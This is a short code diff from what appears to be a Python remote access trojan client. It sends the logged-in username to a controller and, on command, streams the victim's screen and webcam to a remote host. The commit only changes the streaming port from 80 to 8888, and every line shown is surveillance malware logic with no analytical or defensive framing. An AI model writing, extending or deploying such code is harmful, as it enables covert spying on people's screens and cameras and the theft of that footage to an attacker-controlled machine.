@@ -163,12 +163,12 @@ s.send(str(getpass.getuser()).encode("utf-8"))
 while True:
     Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
     if Handler_DATA == "screenshare":
-        screensharetohost = ScreenShareClient(clientHOST, 80)
+        screensharetohost = ScreenShareClient(clientHOST, 8888)
         screensharetohost.start_stream()
     elif Handler_DATA == "screenshare_stop":
         screensharetohost.stop_stream()
     elif Handler_DATA == "webcam_stream":
-        webcam = CameraClient(clientHOST, 80)
+        webcam = CameraClient(clientHOST, 8888)
         webcam.start_stream()
     elif Handler_DATA == "webcam_stream_stop":
         webcam.stop_stream()
